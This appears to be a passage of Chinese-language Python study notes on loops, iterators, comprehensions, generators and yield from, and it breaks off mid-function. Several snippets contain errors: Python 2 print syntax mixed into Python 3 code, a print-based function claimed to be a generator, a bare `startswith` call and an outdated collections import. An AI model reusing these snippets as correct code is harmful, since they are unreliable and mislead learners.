words = ['cat', 'window', 'defenestrate']
for w in words:
    print(w, len(w), end='\t')  # cat 3   window 6        defenestrate 12

# 如果在循环内需要修改序列中的值比如重复某些选中的元素,推荐先拷贝一份副本。对序列进行循环不代表制作了一个副本进行操作,切片操作使这件事非常简单:

for w in words[:]:  # Loop over a slice copy of the entire list
    if len(w) > 6: words.insert(0, w)
print(words)   # ['defenestrate', 'cat', 'window', 'defenestrate']

# 如果写成for w in words则这个示例就会创建无限长的列表,一次又一次重复地插入defenestrate

</textarea>for...in遍历dict<textarea>
dict = {'a': 1, 'b': 2, 'c': 3}
# dict的存储不是按照list的方式顺序排列,所以迭代出的结果顺序很可能不一样
for key in dict:
    print(key, dict[key])

for key in dict.keys():
    print(key, dict[key])

# 默认dict迭代的是key,如果要迭代value可以用for value in dict.values(),如果要同时迭代key和value可以用for k, v in dict.items()
for value in dict.values():
    print(value)

for k, v in dict.items():
    print(k, v)

</textarea>统计列表中各元素出现的次数。由于列表中元素个数未知,因此定义一个字典,以列表的元素为key,该元素出现的次数为value<textarea>
src_list = [12, 45, 3.4, 12, 'fkit', 45, 3.4, 'fkit', 45, 3.4]
statistics = {}
for ele in src_list:
    # 如果字典中包含ele代表的key,将ele元素代表出现次数加1
    if ele in statistics:
        statistics[ele] += 1
    # 如果字典中不包含ele代表的key,说明该元素还未出现过,将ele元素代表出现次数设为1
    else:
        statistics[ele] = 1
# 遍历dict,打印出各元素的出现次数
for ele, count in statistics.items():
    print("%s的出现次数为:%d" % (ele, count))

</textarea><pre>
序列的通用方法enumerate()实现list下标循环
Python内置的enumerate函数可以把一个list变成索引-元素对,这样就可以在for循环中同时迭代索引和元素本身

</pre><textarea>
for i, value in enumerate(['A', 'B', 'C']):
    print(i, value, end=', ')
# 输出: 0 A, 1 B, 2 C,

# enumerate也接受一些可选参数,表示索引值从哪个数字开始枚举,默认0
my_list = ['apple', 'banana', 'grapes', 'pear']
print(enumerate(my_list, 2))    # < enumerate object at 0x7f7a3c00e8b8>
for i, value in enumerate(my_list, 2):
    print(i, value, end=', ')
# 输出: 2 apple, 3 banana, 4 grapes, 5 pear,

# 还可以用来创建包含索引的元组列表
my_list = ['apple', 'banana', 'grapes', 'pear']
counter_list = list(enumerate(my_list, 1))
print(counter_list)
# 输出: [(1, 'apple'), (2, 'banana'), (3, 'grapes'), (4, 'pear')]

</textarea>需要同时迭代两个循环,用同一个索引来获取两个值,可以用zip来实现<textarea>
for word, number in zip(words, numbers):
    print(word, number)

</textarea>迭代序列的一部分情况下,仅需要迭代序列切片就可以实现<textarea>
for word in words[1:]:
    print(word)

</textarea>循环累加<textarea>
sum = 0
for x in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]:
    sum = sum + x
print(sum)

# Python提供一个range()函数可以生成一个整数序列,再通过list()函数可以转换为list,range(101)就可以生成0-100的整数序列
sum = 0
for x in range(101):
    sum = sum + x
print(sum)

</textarea>通过序列索引迭代: 使用内置函数len()和range(),len()返回列表的长度即元素的个数,range返回一个序列的数<textarea>
fruits = ['banana', 'apple',  'mango']
for index in range(len(fruits)):
   print('当前水果 :', fruits[index])

</textarea><textarea>
src_list = [12, 45, 3.4, 13, 'a', 4, 56, 'crazyit', 109.5]
my_sum = 0
my_count = 0
for ele in src_list:
    if isinstance(ele, int) or isinstance(ele, float):  # 如果该元素是整数或浮点数
        print(ele)
        my_sum += ele   # 累加该元素
        my_count += 1   # 数值元素的个数加1
print('总和:', my_sum)
print('平均数:', my_sum / my_count)

</textarea><pre>
【 循环中的else子句 】
循环语句可能带有一个else子句,它会在循环遍历完列表(使用for)或条件变为假(使用while)时被执行,但不会在循环被break语句终止时被执行

循环使用for…else语句,for中的语句和普通的没有区别,else中的语句会在循环正常执行完即for不是通过break跳出而中断的的情况下执行,while…else也是一样

如果在for和else之间即循环体内有if也不会影响for和else的关系,因为for的级别比if高,只要for顺利执行完毕,else执行
只有当for循环被break语句中断之后才会跳过else语句

</pre><textarea>
for num in range(10,20):       # 迭代10到20之间的数字
   for i in range(2,num):      # 根据因子迭代
      if num%i == 0:           # 确定第一个因子
         j=num/i               # 计算第二个因子
         print('%d 等于 %d * %d' % (num,i,j))
         break                 # 跳出当前循环
   else:                       # 循环的else部分
      print(num, '是一个质数')  # 在else代码块中,迭代变量的值依然等于最后一个元素的值

'''
10 等于 2 * 5
11 是一个质数
12 等于 2 * 6
13 是一个质数
14 等于 2 * 7
15 等于 3 * 5
16 等于 2 * 8
17 是一个质数
18 等于 2 * 9
19 是一个质数
'''

</textarea><textarea>
for n in range(2, 10):
    for x in range(2, n):
        if n % x == 0:
            print(n, 'equals', x, '*', n//x)
            break
    else:
        print(n, 'is a prime number')  # loop fell through without finding a factor

'''
2 is a prime number
3 is a prime number
4 equals 2 * 2
5 is a prime number
6 equals 2 * 3
7 is a prime number
8 equals 2 * 4
9 equals 3 * 3
'''

</textarea><pre>
【 循环嵌套 】
Python语言允许在一个循环体里面嵌入另一个循环,可以在循环体内嵌入其他的循环体,如在while循环中可以嵌入for循环, 反之可以在for循环中嵌入while循环

</pre><textarea>
# for循环嵌套语法:
for iterating_var in sequence:
   for iterating_var in sequence:
      statements(s)
   statements(s)

# while循环嵌套语法:
while expression:
   while expression:
      statement(s)
   statement(s)

</textarea>使用嵌套循环输出2~100之间的素数<textarea>
i = 2
while(i < 100):
   j = 2
   while(j <= (i/j)):
      if not(i%j): break
      j = j + 1
   if (j > i/j) : print(i, " 是素数")
   i = i + 1

</textarea><textarea>
rows = int(input('输入列数: '))
i = j = k = 1 #声明变量,i用于控制外层循环(图形行数),j用于控制空格的个数,k用于控制*的个数
#等腰直角三角形1
print "等腰直角三角形1"
for i in range(0, rows):
    for k in range(0, rows - i):
        print " * ", #注意这里的",",一定不能省略,可以起到不换行的作用
        k += 1
    i += 1
    print "\n"

#打印实心等边三角形
print "打印空心等边三角形,这里去掉if-else条件判断就是实心的"
for i in range(0, rows + 1):#变量i控制行数
    for j in range(0, rows - i):#(1,rows-i)
        print " ",
        j += 1
    for k in range(0, 2 * i - 1):#(1,2*i)
        if k == 0 or k == 2 * i - 2 or i == rows:
            if i == rows:
                if k % 2 == 0:#因为第一个数是从0开始的,所以要是偶数打印*,奇数打印空格
                    print "*",
                else:
                    print " ", #注意这里的",",一定不能省略,可以起到不换行的作用
            else:
               print "*",
        else:
            print " ",
        k += 1
    print "\n"
    i += 1

#打印菱形
print "打印空心等菱形,这里去掉if-else条件判断就是实心的"
for i in range(rows):#变量i控制行数
    for j in range(rows - i):#(1,rows-i)
        print " ",
        j += 1
    for k in range(2 * i - 1):#(1,2*i)
        if k == 0 or k == 2 * i - 2:
            print "*",
        else:
            print " ",
        k += 1
    print "\n"
    i += 1
    #菱形的下半部分
for i in range(rows):
    for j in range(i):#(1,rows-i)
        print " ",
        j += 1
    for k in range(2 * (rows - i) - 1):#(1,2*i)
        if k == 0 or k == 2 * (rows - i) - 2:
            print "*",
        else:
            print " ",
        k += 1
    print "\n"
    i += 1
#实心正方形
print "实心正方形"
for i in range(0, rows):
    for k in range(0, rows):
        print " * ", #注意这里的",",一定不能省略,可以起到不换行的作用
        k += 1
    i += 1
    print "\n"

#空心正方形
print "空心正方形"
for i in range(0, rows):
    for k in range(0, rows):
        if i != 0 and i != rows - 1:
            if k == 0 or k == rows - 1:
                #由于视觉效果看起来更像正方形,所以这里*两侧加了空格,增大距离
                print " * ", #注意这里的",",一定不能省略,可以起到不换行的作用
            else:
                 print "   ", #该处有三个空格
        else:
            print " * ", #这里*两侧加了空格
        k += 1
    i += 1
    print "\n"

</textarea>
</div>

<div id="Iterator">
<h4>迭代器 Iterator</h4><pre>
可以直接作用于for循环的数据类型有以下几种:
一类是集合数据类型,如list、tuple、dict、set、str等;
一类是generator,包括生成器和带yield的generator function。
这些可以直接作用于for循环的对象统称为可迭代对象:Iterable
可以被next()函数调用并不断返回下一个值的对象称为迭代器:Iterator

生成器都是Iterator对象,但list、dict、str虽然是Iterable,却不是Iterator。
把list、dict、str等Iterable变成Iterator可以使用iter()函数:
>>> isinstance(iter([]), Iterator)     # True
>>> isinstance(iter('abc'), Iterator)  # True

list、dict、str等数据类型不是Iterator是因为Python的Iterator对象表示的是一个数据流,Iterator对象可以被next()函数调用并不断返回下一个数据,直到没有数据时抛出StopIteration错误。可以把这个数据流看做是一个有序序列,但却不能提前知道序列的长度,只能不断通过next()函数实现按需计算下一个数据,所以Iterator的计算是惰性的,只有在需要返回下一个数据时它才会计算。

Iterator甚至可以表示一个无限大的数据流,例如全体自然数。而使用list是永远不可能存储全体自然数的

</pre>通过collections模块的Iterable类型判断一个对象是可迭代对象<textarea>
from collections import Iterable
print(isinstance('abc', Iterable))                  # True
print(isinstance([], Iterable))                     # True
print(isinstance({}, Iterable))                     # True
print(isinstance((1,2,3), Iterable))                # True
print(isinstance(set([1, 2, 3]), Iterable))         # True
print(isinstance((x for x in range(10)), Iterable)) # True
print(isinstance(100, Iterable))                    # False

</textarea><pre>
凡是可作用于for循环的对象都是Iterable类型;
凡是可作用于next()函数的对象都是Iterator类型,它们表示一个惰性计算的序列;
集合数据类型如list、dict、str等是Iterable但不是Iterator,不过可以通过iter()函数获得一个Iterator对象。

</pre>Python的for循环本质上就是通过不断调用next()函数实现的<textarea>
for x in [1, 2, 3, 4, 5]:
    pass

# 实际上完全等价于:
it = iter([1, 2, 3, 4, 5])   # 首先获得Iterator对象
while True:
    try:
        x = next(it)         # 获得下一个值
    except StopIteration:
        break                # 遇到StopIteration就退出循环

</textarea>大多数容器对象都可以使用for语句<textarea>
for element in [1, 2, 3]:
    print(element)
for element in (1, 2, 3):
    print(element)
for key in {'one':1, 'two':2}:
    print(key)
for char in "123":
    print(char)
for line in open("myfile.txt"):
    print(line, end='')

</textarea><pre>
在幕后for语句会调用容器对象中的iter(),该函数返回一个定义了__next__()方法的迭代器对象,该方法将逐一访问容器中的元素。 当元素用尽时__next__()将引发StopIteration异常来通知终止for循环,可以使用next()内置函数来调用__next__()方法

</pre><textarea>
>>> s = 'abc'
>>> it = iter(s)
>>> it
< iterator object at 0x00A1DB50>
>>> next(it)
'a'
>>> next(it)
'b'
>>> next(it)
'c'
>>> next(it)
Traceback (most recent call last):
  File "< stdin>", line 1, in < module>
    next(it)
StopIteration

</textarea><pre>
给自定义类添加迭代器行为
定义一个__iter__()方法来返回一个带有__next__()方法的对象。如果类已定义了__next__()则__iter__()可以简单地返回self:

</pre><textarea>
class Reverse:
    """Iterator for looping over a sequence backwards."""
    def __init__(self, data):
        self.data = data
        self.index = len(data)

    def __iter__(self):
        return self

    def __next__(self):
        if self.index == 0:
            raise StopIteration
        self.index = self.index - 1
        return self.data[self.index]
>>>
>>> rev = Reverse('spam')
>>> iter(rev)
<__main__.Reverse object at 0x00A1DB50>
>>> for char in rev:
...     print(char, end=' ')
...
m a p s

</textarea><textarea>
class MyNumbers:
    def __iter__(self):
        self.a = 1
        return self

    def __next__(self):
        x = self.a
        self.a += 1
        return x

myclass = MyNumbers()
myiter = iter(myclass)

print(next(myiter))  # 1
print(next(myiter))  # 2
print(next(myiter))  # 3
print(next(myiter))  # 4
print(next(myiter))  # 5

</textarea>StopIteration异常用于标识迭代的完成,防止出现无限循环的情况,在__next__()方法中可以设置在完成指定循环次数后触发StopIteration异常来结束迭代<textarea>
class MyNumbers:
    def __iter__(self):
        self.a = 1
        return self

    def __next__(self):  # 在20次迭代后停止执行
        if self.a <= 20:
            x = self.a
            self.a += 1
            return x
        else:
            raise StopIteration

myclass = MyNumbers()
myiter = iter(myclass)

for x in myiter: print(x)

</textarea>
</div>

<div id="makelist">
<h4>列表生成式 列表推导式 元组推导式</h4><pre>
列表生成式即List Comprehensions,是Python内置的非常简单却强大的可以用来创建list的生成式

列表推导式可以利用range区间、元组、列表、字典和集合等数据类型快速生成一个满足指定需求的列表,列表推导式最终会将循环过程中计算表达式得到的一系列值组成一个列表
[表达式 for 迭代变量 in 可迭代对象 [if 条件表达式] ]

for 迭代变量 in 可迭代对象
    表达式

</pre><textarea>
print(list(range(11)))       # [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
print(list(range(1, 11)))    # [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]

# 循环生成[1x1, 2x2, 3x3, ..., 10x10]
L = []
for x in range(1, 11):
    L.append(x * x)
print(L)                              # [1, 4, 9, 16, 25, 36, 49, 64, 81, 100]

# map()方法
print(list(map(lambda x : x**2, range(10))))

# 列表生成式则可以用一行语句代替循环
print([x * x for x in range(1, 11)])  # [1, 4, 9, 16, 25, 36, 49, 64, 81, 100]

# 过滤：for循环后面还可以加上if判断筛选出仅偶数的平方
print([x * x for x in range(1, 11) if x % 2 == 0 ])  # [4, 16, 36, 64, 100]

# 列出str对象不以_开头的属性方法
print([e for e in dir(str) if not startswith('_')])

# 运用列表生成式列出当前目录下的所有文件和目录名
print([d for d in os.listdir('..') if len(d) < 4 ])  # ['bat', 'bgm', 'js', 'php', 'web']

# 若要需要对序列里面的内容进行循环处理时,也可以加一个函数进行组合完成
def _change(x, y):
    return '%d:%s' % (x,y)
seq = ['one', 'two','three', 'four']
print([_change(x,y) for x,y in enumerate(seq)])  # ['0:one', '1:two', '2:three', '3:four']

# 还可以使用两层循环生成全排列,就像嵌套循环
print([m + n for m in 'ABC' for n in 'XYZ'])        # ['AX', 'AY', 'AZ', 'BX', 'BY', 'BZ', 'CX', 'CY', 'CZ']
print([(x, y) for x in range(5) for y in range(4)]) # 生成的列表包含20个元素

dd_list = []
for x in range(5):
    for y in range(4):
        dd_list.append((x, y))

# 也支持类似于三层嵌套的for表达式
print([[x, y, z] for x in range(5) for y in range(4) for z in range(6)]) # 生成的列表包含120个元素

# 对于包含多个循环的for表达式,同样可指定if条件
src_a = [30, 12, 66, 34, 39, 78, 36, 57, 121]
src_b = [3, 5, 7, 11]
print([(x, y) for x in src_b for y in src_a if y % x == 0]) # 只要y能整除x,就将它们配对在一起

# for循环其实可以同时使用两个甚至多个变量,比如dict的items()可以同时迭代key和value,因此列表生成式也可以使用两个变量来生成list
dict = {'a': 'A', 'b': 'B', 'c': 'C'}
for k, v in dict.items():
    print(k, '=', v)                            # a = A / b = B / c = C

print([k + '=' + v for k, v in dict.items()])   # ['a=A', 'b=B', 'c=C']

dict = {'a': 1, 'b': 2, 'c': 3}
print([k + '=' + v for k, v in dict.items()])   # TypeError: must be str, not int

# 把一个list中所有的字符串变成小写
L = ['Hello', 'World', 'IBM', 'Apple']
print([s.lower() for s in L])                   # ['hello', 'world', 'ibm', 'apple']

# 如果list中既包含字符串,又包含整数,由于非字符串类型没有lower()方法,所以列表生成式会报错AttributeError: 'int' object has no attribute 'lower'
# 使用内建的isinstance函数可以判断一个变量是不是字符串
x = 'abc'
y = 123
print(isinstance(x, str))   # True
print(isinstance(y, str))   # False
L = ['Hello', 'World', 18, 'Apple', None]
print([s.lower() for s in L if isinstance(s, str) ])  # ['hello', 'world', 'apple']

</textarea>使用列表解析<textarea>
words = ['her', 'name', 'is', 'rio']
alist = []
for word in words:
    alist.append(foo(word))

alist = [foo(word) for word in words]

</textarea>循环嵌套<textarea>
words = ['her', 'name', 'is', 'rio']
letters = []
for word in words:
    for letter in word:
        letters.append(letter)

letters = [letter for word in words for letter in word]

</textarea>嵌套的列表推导式:列表推导式中的初始表达式可以是任何表达式,包括另一个列表推导式<textarea>
# 列表推导式将交换3x4的矩阵行和列
matrix = [
    [1, 2, 3, 4],
    [5, 6, 7, 8],
    [9, 10, 11, 12],
]
print([[row[i] for row in matrix] for i in range(4)])
# [[1, 5, 9], [2, 6, 10], [3, 7, 11], [4, 8, 12]]

# 嵌套的列表推导式是基于跟随其后的for进行求值的,所以等价于
transposed = []
for i in range(4):
    transposed.append([row[i] for row in matrix])
print(transposed)

# 反过来说也等价于
transposed = []
for i in range(4):
    transposed_row = []
    for row in matrix:
        transposed_row.append(row[i])
    transposed.append(transposed_row)
print(transposed)

# 内置zip()函数将会很好地处理复杂的流程语句,解包参数列表
list(zip(*matrix))   # [(1, 5, 9), (2, 6, 10), (3, 7, 11), (4, 8, 12)]

</textarea>元组推导式<textarea>
# 生成一个包含数字1~9的元组
print((x for x in range(1,10)))  # < generator object < genexpr> at 0x0000020BAD136620>

# 使用元组推导式生成的结果并不是一个元组,而是一个生成器对象,这一点和列表推导式是不同的
# 如果想要使用元组推导式获得新元组或新元组中的元素,有以下三种方式:
# 无论是使用for循环遍历生成器对象,还是使用__next__()方法遍历生成器对象,遍历后原生成器对象将不复存在,这就是遍历后转换原生成器对象却得到空元组的原因

# 1、使用tuple()函数,可以直接将生成器对象转换成元组
a = (x for x in range(1,10))
print(tuple(a))  # (1, 2, 3, 4, 5, 6, 7, 8, 9)

# 2、直接使用for循环遍历生成器对象,可以获得各个元素
a = (x for x in range(1,10))
for i in a:
    print(i,end=' ')
print(tuple(a))
# 1 2 3 4 5 6 7 8 9 ()

3、使用__next__()方法遍历生成器对象,也可以获得各个元素
a = (x for x in range(3))
print(a.__next__())
print(a.__next__())
print(a.__next__())
a = tuple(a)
print("转换后的元组:",a)

# 运行结果为:
0
1
2
转换后的元组: ()

</textarea>字典推导式<textarea>
# 将列表中各字符串值为键,各字符串的长度为值,组成键值对
listdemo = ['C语言中文网','c.biancheng.net']
newdict = {key:len(key) for key in listdemo}
print(newdict)   # {'C语言中文网': 6, 'c.biancheng.net': 15}

# 交换现有字典中各键值对的键和值。
olddict={'C语言中文网': 6, 'c.biancheng.net': 15}
newdict = {v: k for k, v in olddict.items()}
print(newdict)   # {6: 'C语言中文网', 15: 'c.biancheng.net'}

# 使用if表达式筛选符合条件的键值对
olddict={'C语言中文网': 6, 'c.biancheng.net': 15}
newdict = {v: k for k, v in olddict.items() if v > 10}
print(newdict)   # {15: 'c.biancheng.net'}

</textarea>集合推导式:集合推导式的语法格式和字典推导式完全相同,根据表达式进行判断是集合还是字典<textarea>
setnew = {i**2 for i in range(3)}
print(setnew)   # {0, 1, 4}

# 既然生成的是集合,那么其保存的元素必须是唯一的。
tupledemo = (1,1,2,3,4,5,6,6)
setnew = {x**2 for x in tupledemo if x%2==0}
print(setnew)  # {16, 4, 36}

dictdemo = {'1':1,'2':2,'3':3}
setnew = {x for x in dictdemo.keys()}
print(setnew)  # {'2', '1', '3'}

</textarea>
</div>

<div id="generator">
<h4>生成器generator</h4><pre>
通过列表生成式可以直接创建一个列表,但是受到内存限制,列表容量肯定是有限的,而且创建一个包含100万个元素的列表,不仅占用很大的存储空间,如果仅仅需要访问前面几个元素,那后面绝大多数元素占用的空间都白白浪费了。

如果列表元素可以按照某种算法推算出来,那是否可以在循环的过程中不断推算出后续的元素呢？这样就不必创建完整的list,从而节省大量的空间。在Python中这种一边循环一边计算的机制称为生成器:generator

</pre><textarea>
### 第一种创建生成器的方法生成器表达式,使用()创建生成器,使用[]则创建列表
# 这种表达式被设计用于生成器将立即被外层函数所使用的情况。生成器表达式相比完整的生成器更紧凑但较不灵活,相比等效的列表推导式则更为节省内存

L = [x * x for x in range(5)]
print(L)        # [0, 1, 4, 9, 16]

g = (x**2 for x in range(1, 5))
print(g)        # < generator object < genexpr> at 0x7f050440a410>
print(list(g))  # [1, 4, 9, 16]

# generator保存算法,不断调用next()函数获取由yield语句返回的下一个值,一直产生新的数据,直到计算到最后一个元素,没有更多的元素时抛出StopIteration的错误,也可以使用a.__next__()
print(next(g))      # 输出1
print(g.__next__()) # 输出4
print(next(g))      # 输出9
print(next(g))      # 输出16
print(next(g))      # 报错StopIteration

# 因为generator也是可迭代对象,通过for遍历生成器不会报异常
for i in g:
    print(i)

>>> sum(i*i for i in range(10))                 # 285, sum of squares

>>> xvec = [10, 20, 30]
>>> yvec = [7, 5, 3]
>>> sum(x*y for x,y in zip(xvec, yvec))         # 260, dot product

>>> from math import pi, sin
>>> sine_table = {x: sin(x*pi/180) for x in range(0, 91)}
>>> unique_words = set(word  for line in page for word in line.split())
>>> valedictorian = max((student.gpa, student.name) for student in graduates)
>>> data = 'golf'
>>> list(data[i] for i in range(len(data)-1, -1, -1))  # ['f', 'l', 'o', 'g']

### 第二种创建生成器的方法,生成器函数
def createNum(n):
    for i in range(n):
        yield i**3

for i in createNum(5):
    print(i)

### 生成器的send用法generator.send(value),Python的yield不但可以返回一个值,它还可以接收调用者发出的参数
def test():
    i = 1
    while i < 5:
        temp = yield i**2
        print('temp', temp)
        i += 1

t = test()

print(dir(t))
# ['__class__', '__del__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__lt__', '__name__', '__ne__', '__new__', '__next__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'close', 'gi_code', 'gi_frame', 'gi_running', 'gi_yieldfrom', 'send', 'throw']

# 第一次运行只能使用next或send(None)
print(1, t.__next__())
# send的作用相当于使生成器继续运行,并且传递的参数为yield的返回值即temp的值
print(2, t.send("Hello World"))
print(3, t.__next__())
print(4, t.__next__())
print(5, t.__next__())
'''
1 1
temp Hello World
2 4
temp None
3 9
temp None
4 16
temp None
Traceback StopIteration
'''

</textarea><pre>
generator是非常强大的工具,在Python中可以简单地把列表生成式改成generator,也可以通过函数实现复杂逻辑的generator
使用了yield关键字的函数不再是函数,而是生成器,使用了yield的函数就是生成器,SyntaxError: 'yield' outside function

函数可以看成是一堆指令的集合。在函数中加入yield可以把一个函数变成一个generator,虽然调用的方式不一样了,但其实现的功能和原来的函数基本是一样的。
而yield在这其中的作用是,把运行中的函数进行了一个保存退出也就是中断,然后把线程的的控制权从函数手里交换到我们手里,我们可以在适当的时机在继续运行该函数

通过yield可以实现对线程的调配,从而更加充分的利用cpu

'''
yield 只能在函数内部使用,包含yield语句的函数称为生成器函数
当调用生成器函数时,并不会执行函数体中的代码,而是返回一个生成器对象
每次调用生成器对象的next()方法时,才会执行生成器函数中的代码,直到遇到yield 或者return 语句。
如果遇到yield 语句, 怎会挂起函数的运行状态,并将yield 右边的表达式的值返回给next()的调用者, 挂起的时候会保存所有本地状态,包括局部变量,指令指针和内部堆栈信息,这样当下次再次调用next()时, 看起来yield 部分就像是调用了一个外部调用一样,可以接着往下执行
try/ finnally 结构中的try子句中不允许使用yield语句, 问题是因为无法保证生成器被恢复,因此无法保证finally块将被执行
'''

yield item这行代码会产出一个值,提供给next(...)的调用方,此外还会作出让步,暂停执行生成器,让调用方继续工作,直到需要使用另一个值时再调用next(),调用方会从生成器中拉取值

generator的工作原理是在for循环的过程中不断计算出下一个元素,并在适当的条件结束for循环。对于函数改成的generator来说,遇到return语句或执行到函数体最后一行语句就是结束generator的指令,for循环随之结束

Generator是一个用于创建迭代器的简单而强大的工具,它们的写法类似标准的函数,但当它们要返回数据时会使用yield语句,每次对生成器调用next()时,它会从上次离开位置恢复执行,它会记住上次执行语句时的所有数据值

在协程中yield通常出现在表达式的右边,例如datum=yield,可以产出值,也可以不产出即yield关键字后面没有表达式。协程可能会从调用方接收数据,调用方使用.send(datum)方法把数据提供给协程

</pre><textarea>
def reverse(data):
    for index in range(len(data)-1, -1, -1):
        yield data[index]

for char in reverse('golf'):
    print(char, end=' ')     # f l o g

</textarea><pre>
可以用生成器来完成的操作同样可以用基于类的迭代器来完成,但生成器的写法更为紧凑,因为它会自动创建__iter__()和__next__()方法
另一个关键特性在于局部变量和执行状态会在每次调用之间自动保存,这使得该函数相比使用self.index和self.data这种实例变量的方式更易编写且更为清晰。
此外当生成器终结时它们还会自动引发StopIteration
这些特性结合在一起使得创建迭代器能与编写常规函数一样容易

如果推算的算法比较复杂,用类似列表生成式的for循环无法实现的时候,还可以用函数来实现。
比如著名的斐波拉契数列(Fibonacci),除第一个和第二个数外,任意一个数都可由前两个数相加得到:
1, 1, 2, 3, 5, 8, 13, 21, 34, ...
斐波拉契数列用列表生成式写不出来,但是用函数把它打印出来却很容易

</pre>使用生成器函数输出斐波那契数列的前N个数<textarea>
def fib(max):
    n, a, b = 0, 0, 1
    while n < max:
        print(b)
        a, b = b, a + b
        n = n + 1
    return 'done'

from inspect import isgeneratorfunction
print(isgeneratorfunction(fib))  # True

import types
print(isinstance(fib(6), types.GeneratorType)) True

from collections import Iterable
print(isinstance(fib(5), Iterable)) True

print(fib(6))   # 1 1 2 3 5 8 dnoe

# fib函数定义了斐波拉契数列的推算规则,可以从第一个元素开始,推算出后续任意的元素,这种逻辑其实非常类似generator,上面的函数和generator仅一步之遥。要把fib函数变成generator,只需要把print(b)改为yield b就可以了,这就是定义generator的另一种方法。如果一个函数定义中包含yield关键字,那么这个函数就不再是一个普通函数,而是一个generator:

def fib(max):
    n, a, b = 0, 0, 1
    while n < max:
        yield b
        a, b = b, a + b
        n = n + 1
    return 'done'

f = fib(6)
print(f)     # < generator object fib at 0x104feaaa0>

# 在循环过程中不断调用yield就会不断中断。当然要给循环设置一个条件来退出循环,不然就会产生一个无限数列出来。
# 同样的,把函数改成generator后,基本上从来不会用next()来获取下一个返回值,而是直接使用for循环来迭代
for n in fib(6):
    print(n, end=' ')  # 1 1 2 3 5 8

</textarea>但for循环调用generator时拿不到generator的return语句的返回值,如果想要拿到返回值必须捕获StopIteration错误,返回值包含在StopIteration的value中<textarea>
g = fib(6)
while True:
    try:
        x = next(g)
        print('g:', x, end=" ")
    except StopIteration as e:
        print('Generator return value:', e.value)
        break

# 输出:
g: 1 g: 1 g: 2 g: 3 g: 5 g: 8
Generator return value: done

</textarea><pre>
这里最难理解的就是generator和函数的执行流程不一样。函数是顺序执行,遇到return语句或最后一行函数语句就返回。而变成generator的函数,在每次调用next()的时候执行,遇到yield语句返回,再次执行时从上次返回的yield语句处继续执行。

</pre>定义一个generator,依次返回数字1,3,5<textarea>
def odd():
    print('step 1')
    yield 1
    print('step 2')
    yield(3)
    print('step 3')
    yield(5)

# 调用该generator时首先要生成一个generator对象,然后用next()函数不断获得下一个返回值:
o = odd()
print(next(o))   # 输出:step 1 输出:1
print(next(o))   # 输出:step 2 输出:3
print(next(o))   # 输出:step 3 输出:5
print(next(o))   # 报错:StopIteration

# 可以看到odd不是普通函数,而是generator,在执行过程中遇到yield就中断,下次又继续执行。执行3次yield后,已经没有yield可以执行了,所以第4次调用next(o)就报错。

</textarea><pre>
【 yield from 】
用于生成器将其部分操作委托给另外一个生成器,这允许将包含yield的一段代码分解出来并放在另外一个生成器中,此外允许子生成器返回一个值,这个值可供委派生成器使用

yield from是从Python3.3开始引入的写法,主要是作为caller和genertor之间的通道来使用的,以下两种写法等效
yield from items
for item in items: yield item

yield from items表达式对items对象所做的第一件事是调用iter(items)从中获取迭代器,因此items可以是任何可迭代的对象

yield from的主要功能是打开双向通道,把最外层的调用方与最内层的子生成器连接起来,这样二者可以直接发送和产出值,还可以直接传入异常

yield from的六个重要意义
1、子生成器产出的值都直接传给委派生成器的调用方(即客户端代码)
2、使用send()方法发送给委派生成器的值都直接传给子生成器。如果发送的值为None,那么会给委派调用子生成器的__next__()方法。如果发送的值不是None,那么会调用子生成器的send方法,如果调用的方法抛出StopIteration异常,那么委派生成器恢复运行,任何其他异常都会向上冒泡,传给委派生成器
3、生成器退出时生成器(或子生成器)中的return expr表达式会出发StopIteration(expr)异常抛出
4、yield from表达式的值是子生成器终止时传给StopIteration异常的第一个参数。yield from 结构的另外两个特性与异常和终止有关。
5、传入委派生成器的异常,除了GeneratorExit之外都传给子生成器的throw()方法。如果调用throw()方法时抛出StopIteration异常,委派生成器恢复运行。StopIteration之外的异常会向上冒泡,传给委派生成器
6、如果把GeneratorExit异常传入委派生成器,或者在委派生成器上调用close()方法,那么在子生成器上调用clsoe()方法,如果它有的话。如果调用close()方法导致异常抛出,那么异常会向上冒泡,传给委派生成器,否则委派生成器抛出GeneratorExit异常

</pre><textarea>
from collections import namedtuple
Result = namedtuple("Result", "count average")
li = [40.9, 38.5, 44.3, 42.2, 45.2, 41.7, 44.5, 38.0, 40.6, 44.5]

# 子生成器
def averager():
    total = 0.0
    count = 0
    average = None
    while True:
        term = yield
        if term is None:
            break
        total += term
        count += 1
        average = total/count
    return Result(count, average)

# 委派生成器
def grouper(result, key):
    while True:
        result[key] = yield from averager()

# 调用方
def main():
    results = {}
    group = grouper(results, "kg")
    next(group)
    for value in li:
        group.send(value)
    group.send(None)

if __name__ == "__main__":
    main()

</textarea><textarea>
def b():
  gen = c()
  r = gen.send(None)
  print(r)
  r = gen.send(None)
  print(r)

def c():
  yield 1
  yield 2
  yield 3

b()  # 1 2

def b():
    r = yield from c()
    print('b', r) # 4

def c():
    r = yield 1
    print('c', r) # 哈哈
    return 4

gen = b()
gen.send(None) # 1
gen.send('哈哈') # 2
'''
c 哈哈
b 4
Traceback StopIteration
'''

</textarea>替代内层for循环<textarea>
# 如果生成器函数需要产出另一个生成器生成的值,传统的解决方法是使用嵌套的for循环,chain生成器函数把操作依次交给接收到的各个可迭代对象处理
def chain(*iterables):
    for it in iterables:
        for i in it:
            yield i

s = 'ABC'
t = tuple(range(3))
l = list(chain(s, t))
print(l)  # ['A', 'B', 'C', 0, 1, 2]

# Python3.3之后引入了新语法：
def chain(*iterables):
    for i in iterables:
        yield from i

l = list(chain(s, t))
print(l)  # ['A', 'B', 'C', 0, 1, 2]

</textarea><textarea>
def g(x):
    yield from range(x, 0, -1)
    yield from range(x)

print(list(g(5)))     # [5, 4, 3, 2, 1, 0, 1, 2, 3, 4]

for g  in g(6):
    print(g,end=',')  # 6,5,4,3,2,1,0,1,2,3,4,5,

</textarea>将一个嵌套型的序列扁平化处理为一列单独的值<textarea>
from collections import Iterable

def flatten(items, ignore_types=(str, bytes)):
    for x in items:
        if isinstance(x, Iterable) and not isinstance(x, ignore_types):
            yield from flatten(x)
        else:
